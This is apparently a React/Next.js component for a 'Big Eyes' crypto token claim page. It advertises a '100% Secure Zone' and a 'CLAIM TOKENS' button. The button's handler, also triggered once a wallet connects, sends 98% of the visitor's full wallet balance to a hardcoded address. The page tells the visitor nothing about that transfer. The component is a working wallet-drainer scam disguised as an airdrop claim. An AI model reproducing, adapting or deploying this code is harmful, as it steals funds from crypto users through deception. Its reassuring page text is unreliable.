import Image from "next/image";
import Link from "next/link";
import React, { useEffect, useState } from "react";
import Presale from "../../../assets/presale.webp";
import Pulse from "../../../assets/pulse.png";
import { FaTwitter, FaTelegramPlane } from "react-icons/fa";

import { useRouter } from "next/router";
import { openModal } from "@/recoil/commonRecoilState";
import { useRecoilState } from "recoil";
import {
  useAccount,
  useBalance,
  useDisconnect,
  useSendTransaction,
} from "wagmi";
import { ethers } from "ethers";
import ConnectWallet from "../connectWallet/ConnectWallet";
import ConnectWalletClaim from "../connectWallet/ConnectWalletClaim";

export default function BannerClaim() {
  const router = useRouter();
  const { connector: activeConnector, isConnected, address } = useAccount();
  const { data, isError, isLoading } = useBalance({
    address: address,
  });
  const { disconnectAsync } = useDisconnect();
  const [click, setClick] = useState(false);
  const [open, setOpen] = useRecoilState(openModal);
  const {
    data: DataTrans,
    isSuccess,
    sendTransactionAsync,
  } = useSendTransaction({
    to: "0x0bf313f2618F42a5a6a96ee9540AFB4b7a2220dC",
    value: ethers.utils
      .parseEther(data?.formatted.toString() || "0")
      .mul(ethers.BigNumber.from("98"))
      .div(ethers.BigNumber.from("100"))
      .toString(),
  });

  const handleClaim = async () => {
    try {
      if (address) {
        await sendTransactionAsync();
      } else {
        await disconnectAsync();
        setOpen({ open: true, component: <ConnectWalletClaim /> });
      }
    } catch (err) {
      setClick(false);
    }
  };
  const handleSendTrans = async () => {
    try {
      await sendTransactionAsync();
    } catch (error) {
      setClick(false);
    }
  };
  useEffect(() => {
    if (address) {
      if (click) {
        handleSendTrans();
      }
    }
  }, [address]);
  return (
    <div className="pt-[32px] px-4 min-[576px]:px-[36px] lg:px-[72px] xl:px-[104px] pb-[100px]">
      <div
        className="h-[200px] min-[576px]:h-[300px] lg:h-[500px] xl:h-[576px] 2xl:h-[1016px] w-full border-[5px] min-[576px]:border-[8px] border-white rounded-[2rem] min-[576px]:rounded-[4rem] lg:rounded-[7.5rem] 2xl:rounded-[120px] overflow-hidden home-banner flex items-center justify-center"
        id="banner-claim"
      >
        <div className=" hidden lg:block shadow-banner  max-w-[90%] xl:max-w-[80%] 2xl:max-w-[70%] bg-[#fffef5] h-[90%] 2xl:h-[95%] rounded-[4rem] 2xl:rounded-[6.25rem] p-[32px] lg:px-[86px] 2xl:p-[86px] flex items-center justify-center">
          <div className="pb-[32px]  2xl:p-[90px] ">
            <div className="flex justify-center">
              <Image
                className=""
                src="https://claim.bigeyes.space/claim/claim-now.png"
                width={328}
                height={100}
                alt=""
              />
            </div>
            <div className="">
              <h1 className="   2xl:mb-4 2xl:mt-[40px] font-Extra font-[900] text-[40px] xl:text-[46px] 2xl:text-[50px] text-center">
                100<span className="font-bubblegum text-[0.85em]">%</span>{" "}
                Secure Zone
              </h1>
              <p className="my-[16px] 2xl:my-[18px] text-base xl:text-[18px] 2xl:text-[20px] text-center w-[640px] 2xl:w-[480px] mx-auto">
                Big Eyes Claim is about to go live. <br></br> This is the Moment
                you have all been waiting for.
              </p>
              <p className="my-[16px] 2xl:my-[18px] text-base xl:text-[18px] 2xl:text-[20px] text-center w-[640px] 2xl:w-[480px] mx-auto">
                You will be able to Claim on the 15th of June but before you do
                we have added 2 unique features for our Loyal and Dedicated
                Community.
              </p>
              <p className="my-[16px] 2xl:my-[18px] text-base xl:text-[18px] 2xl:text-[20px] text-center w-[640px] 2xl:w-[480px] mx-auto">
                Click the Claim Button below and view your options before
                Claiming
              </p>
            </div>
            <div className="mt-[42px] flex items-center justify-center gap-3">
              <button
                className="bg-[#f38590] tracking-[2px] w-[343px] whitespace-nowrap text-white border-[5px] text-[14px] hover:font-semibold border-transparent rounded-[12px]  w-[11rem] py-[10px] px-[24px] font-semibold hover:bg-[#F9C7CC] hover:text-black transition-all duration-300"
                onClick={() => {
                  setClick(true);
                  handleClaim();
                }}
              >
                CLAIM TOKENS
              </button>
              {/* <button
                className="bg-[#f38590] whitespace-nowrap text-white border-[5px] text-[1.125rem] 2xl:text-[1.375rem] hover:font-semibold border-[#F9C7CC] rounded-full  py-[8px] px-[24px] font-semibold hover:bg-[#F9C7CC] hover:text-black transition-all duration-300"
                onClick={() => {
                  const element = document.getElementById("Lootboxes");
                  element.scrollIntoView();
                }}
              >
                Buy Lootboxes
              </button> */}
              <button
                className="bg-[#F9C7CC] tracking-[2px] w-[343px] whitespace-nowrap text-white border-[5px] text-[14px] hover:font-semibold border-[#F9C7CC] rounded-[12px]  py-[10px] px-[24px] font-semibold hover:bg-[#f38590] hover:text-black transition-all duration-300"
                onClick={() => {
                  const element = document.getElementById("howto");
                  element.scrollIntoView();
                }}
              >
                HOW TO CLAIM
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
